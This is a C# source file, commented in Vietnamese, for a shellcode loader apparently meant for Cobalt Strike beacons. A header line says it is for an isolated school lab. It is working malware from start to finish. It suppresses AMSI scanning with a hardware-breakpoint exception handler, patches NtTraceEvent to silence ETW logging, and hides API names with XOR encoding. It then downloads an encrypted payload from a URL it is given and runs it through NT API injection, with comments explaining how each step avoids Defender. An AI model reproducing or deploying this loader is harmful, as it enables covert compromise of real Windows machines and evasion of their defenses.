// FinalLoaderV5.cs
// Dựa trên FinalLoaderV4_NoSandbox — tích hợp shellcode injection CS
// Thay RunAssembly (.NET only) → RunShellcode (NT API, no RWX)
// Obfuscation nhất quán: Dec() cho tất cả tên hàm/dll nhạy cảm
// Môi trường: VM cô lập nhà trường
using System;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;

namespace FinalLoaderV5
{
    public class Program
    {
        const string STRING_KEY = "LabSecretKey2026";

        // === Import tối thiểu — chỉ dùng GetProcAddress/LoadLibrary ===
        // Mọi hàm khác đều resolve động qua Dec() để tránh IAT scan
        [DllImport("kernel32", EntryPoint = "GetProcAddress")]
        static extern IntPtr _GetProcAddress(IntPtr hMod, string name);
        [DllImport("kernel32", EntryPoint = "LoadLibraryA")]
        static extern IntPtr _LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentThread();
        [DllImport("kernel32")]
        static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint old);
        [DllImport("ntdll")]
        static extern int NtGetContextThread(IntPtr h, ref CONTEXT ctx);
        [DllImport("ntdll")]
        static extern int NtSetContextThread(IntPtr h, ref CONTEXT ctx);
        [DllImport("kernel32")]
        static extern IntPtr AddVectoredExceptionHandler(uint first, PVECTORED_EXCEPTION_HANDLER handler);

        // === Delegates cho NT injection — resolve động, không xuất hiện trong IAT ===
        delegate int _NtAllocate(IntPtr proc, ref IntPtr addr, IntPtr zero,
                                 ref IntPtr size, uint type, uint prot);
        delegate int _NtProtect(IntPtr proc, ref IntPtr addr, ref IntPtr size,
                                uint newProt, out uint oldProt);
        delegate int _NtCreateThread(out IntPtr hThread, uint access, IntPtr objAttr,
                                     IntPtr proc, IntPtr start, IntPtr param,
                                     bool suspended, uint stackZero, uint stackSize,
                                     uint maxStack, IntPtr attrList);
        delegate uint _NtWait(IntPtr h, bool alert, IntPtr timeout);

        delegate int PVECTORED_EXCEPTION_HANDLER(ref EXCEPTION_POINTERS ep);

        [StructLayout(LayoutKind.Sequential)]
        struct EXCEPTION_RECORD
        {
            public uint   ExceptionCode;
            public uint   ExceptionFlags;
            public IntPtr ExceptionRecordPtr;
            public IntPtr ExceptionAddress;
            public uint   NumberParameters;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct EXCEPTION_POINTERS
        {
            public IntPtr ExceptionRecord;
            public IntPtr ContextRecord;
        }

        const uint CONTEXT_DEBUG_REGISTERS      = 0x00010010;
        const uint EXCEPTION_SINGLE_STEP        = 0x80000004;
        const int  EXCEPTION_CONTINUE_EXECUTION = -1;

        [StructLayout(LayoutKind.Sequential)]
        struct CONTEXT
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6)]
            public ulong[]  p1;
            public uint     ContextFlags;
            public uint     MxCsr;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6)]
            public ushort[] SegRegs;
            public uint     EFlags;
            public ulong    Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 25)]
            public ulong[]  GpRegs;
        }

        static PVECTORED_EXCEPTION_HANDLER vehCallback;
        static IntPtr targetAmsiAddr = IntPtr.Zero;

        // Dec: hex → bytes → XOR với STRING_KEY → string
        static string Dec(string hex)
        {
            byte[] bytes = new byte[hex.Length / 2];
            for (int i = 0; i < hex.Length; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            byte[] key = Encoding.UTF8.GetBytes(STRING_KEY);
            byte[] res = new byte[bytes.Length];
            for (int i = 0; i < bytes.Length; i++)
                res[i] = (byte)(bytes[i] ^ key[i % key.Length]);
            return Encoding.UTF8.GetString(res);
        }

        // ====================================================
        // VEH PATCHLESS AMSI BYPASS
        // Đặt hardware breakpoint (Dr0) trên AmsiScanBuffer
        // VEH handler bắt EXCEPTION_SINGLE_STEP, set RAX=0
        // → AmsiScanBuffer trả về AMSI_RESULT_CLEAN mà không
        //   cần patch byte nào → tránh detect bằng memory scan
        // ====================================================
        static int VehHandler(ref EXCEPTION_POINTERS ep)
        {
            var rec = (EXCEPTION_RECORD)Marshal.PtrToStructure(
                          ep.ExceptionRecord, typeof(EXCEPTION_RECORD));

            if (rec.ExceptionCode == EXCEPTION_SINGLE_STEP &&
                rec.ExceptionAddress == targetAmsiAddr)
            {
                var ctx = (CONTEXT)Marshal.PtrToStructure(
                              ep.ContextRecord, typeof(CONTEXT));
                ctx.GpRegs[0]  = 0;             // RAX = 0 = AMSI_RESULT_CLEAN
                ctx.EFlags    &= ~(uint)0x10000; // clear RF flag
                Marshal.StructureToPtr(ctx, ep.ContextRecord, false);
                return EXCEPTION_CONTINUE_EXECUTION;
            }
            return 0;
        }

        static void SetupVehAmsi()
        {
            vehCallback    = new PVECTORED_EXCEPTION_HANDLER(VehHandler);
            AddVectoredExceptionHandler(1, vehCallback);

            // Dec("0D0411104D4F4F4A") = "amsi.dll"
            // Dec("2D0411103028626D40030707004B") = "AmsiScanBuffer"
            IntPtr hAmsi   = _LoadLibrary(Dec("0D0411104D4F4F4A"));
            targetAmsiAddr = _GetProcAddress(hAmsi, Dec("2D0411103028626D40030707004B"));
            if (targetAmsiAddr == IntPtr.Zero) return;

            var ctx        = new CONTEXT { ContextFlags = CONTEXT_DEBUG_REGISTERS };
            IntPtr hThread = GetCurrentThread();
            NtGetContextThread(hThread, ref ctx);
            ctx.Dr0 = (ulong)targetAmsiAddr.ToInt64();
            ctx.Dr7 = 0x1;
            NtSetContextThread(hThread, ref ctx);
        }

        // ====================================================
        // ETW BYPASS
        // Patch NtTraceEvent với "xor eax,eax; ret" (3 bytes)
        // → Mọi ETW event log đều return sạch, không ghi log
        // ====================================================
        static void EtwBypass()
        {
            // Dec("020D160B1F454F4A") = "ntdll.dll"
            // Dec("220D3615124866664719161B56") = "NtTraceEvent"
            IntPtr hNtdll  = _LoadLibrary(Dec("020D160B1F454F4A"));
            IntPtr ntTrace = _GetProcAddress(hNtdll, Dec("220D3615124866664719161B56"));
            if (ntTrace == IntPtr.Zero) return;

            byte[] patch = { 0x33, 0xC0, 0xC3 }; // xor eax,eax; ret
            uint old = 0, discard = 0;
            VirtualProtect(ntTrace, (UIntPtr)3, 0x40, out old);
            Marshal.Copy(patch, 0, ntTrace, 3);
            VirtualProtect(ntTrace, (UIntPtr)3, old, out discard);
        }

        // XOR decrypt payload
        static byte[] XorBytes(byte[] data, string key)
        {
            byte[] kk = Encoding.UTF8.GetBytes(key);
            byte[] r  = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
                r[i] = (byte)(data[i] ^ kk[i % kk.Length]);
            return r;
        }

        // ====================================================
        // SHELLCODE INJECTION — NT API, no RWX
        // 1. NtAllocateVirtualMemory: alloc RW (không RWX)
        // 2. Marshal.Copy: ghi shellcode vào vùng nhớ
        // 3. NtProtectVirtualMemory: đổi RW → RX (loại bỏ W)
        // 4. NtCreateThreadEx: tạo thread chạy shellcode
        // 5. NtWaitForSingleObject: chờ beacon init xong
        //
        // Tại sao không dùng VirtualAlloc/CreateThread:
        // - Win32 API có IAT entry → dễ detect
        // - RWX page là dấu hiệu inject → Defender bắt ngay
        // - NT* resolve động → không xuất hiện trong IAT
        // ====================================================
        static void RunShellcode(byte[] sc)
        {
            // Dec("020D160B1F454F4A") = "ntdll.dll"
            IntPtr hNtdll = _LoadLibrary(Dec("020D160B1F454F4A"));

            // Dec("0215233F090C1104002E331040444757202C073E0A110B") = "NtAllocateVirtualMemory"
            IntPtr pAlloc = _GetProcAddress(hNtdll,
                Dec("0215233F090C1104002E331040444757202C073E0A110B"));

            // Dec("021532210A171706001D0C0B4645535A01040F3C171A") = "NtProtectVirtualMemory"
            IntPtr pProtect = _GetProcAddress(hNtdll,
                Dec("021532210A171706001D0C0B4645535A01040F3C171A"));

            // Dec("02152121000206002023171C5354774E") = "NtCreateThreadEx"
            IntPtr pCreateThread = _GetProcAddress(hNtdll,
                Dec("02152121000206002023171C5354774E"));

            // Dec("021523170611051500011C47464B55531C061A09") = "NtWaitForSingleObject"
            IntPtr pWait = _GetProcAddress(hNtdll,
                Dec("021523170611051500011C47464B55531C061A09"));

            if (pAlloc == IntPtr.Zero || pProtect == IntPtr.Zero ||
                pCreateThread == IntPtr.Zero) return;

            var NtAlloc  = (  _NtAllocate)Marshal.GetDelegateForFunctionPointer(pAlloc,  typeof(_NtAllocate));
            var NtProt   = (   _NtProtect)Marshal.GetDelegateForFunctionPointer(pProtect, typeof(_NtProtect));
            var NtThread = (_NtCreateThread)Marshal.GetDelegateForFunctionPointer(pCreateThread, typeof(_NtCreateThread));
            var NtWait   = (    _NtWait)Marshal.GetDelegateForFunctionPointer(pWait, typeof(_NtWait));

            IntPtr hProc = (IntPtr)(-1); // current process handle
            IntPtr addr  = IntPtr.Zero;
            IntPtr size  = (IntPtr)sc.Length;

            // Alloc RW — không phải RWX
            // 0x3000 = MEM_COMMIT|MEM_RESERVE, 0x04 = PAGE_READWRITE
            int status = NtAlloc(hProc, ref addr, IntPtr.Zero, ref size, 0x3000, 0x04);
            if (status != 0 || addr == IntPtr.Zero) return;

            // Ghi shellcode vào vùng nhớ
            Marshal.Copy(sc, 0, addr, sc.Length);

            // Đổi RW → RX: 0x20 = PAGE_EXECUTE_READ
            uint oldProt = 0;
            NtProt(hProc, ref addr, ref size, 0x20, out oldProt);

            // Tạo thread tại địa chỉ shellcode
            IntPtr hThread;
            NtThread(out hThread, 0x1FFFFF, IntPtr.Zero, hProc,
                     addr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);

            // Chờ beacon check-in xong rồi mới exit
            if (hThread != IntPtr.Zero)
                NtWait(hThread, false, IntPtr.Zero);
        }

        // ====================================================
        // MAIN
        // args[0] = URL payload.bin (đã XOR encrypt)
        // args[1] = XOR key để decrypt
        // ====================================================
        public static void Main(string[] args)
        {
            // Bypass AMSI và ETW trước khi làm bất cứ thứ gì
            SetupVehAmsi();
            EtwBypass();

            if (args.Length < 2) return;
            string payloadUrl = args[0];
            string payloadKey = args[1];

            byte[] enc = null;
            try
            {
                using (var handler = new HttpClientHandler())
                using (var client  = new HttpClient(handler))
                {
                    // UA khớp với Malleable C2 profile và redirector filter
                    client.DefaultRequestHeaders.UserAgent.ParseAdd(
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0");
                    enc = client.GetByteArrayAsync(payloadUrl).GetAwaiter().GetResult();
                }
            }
            catch { return; }

            byte[] sc = XorBytes(enc, payloadKey);
            RunShellcode(sc);
        }
    }
}
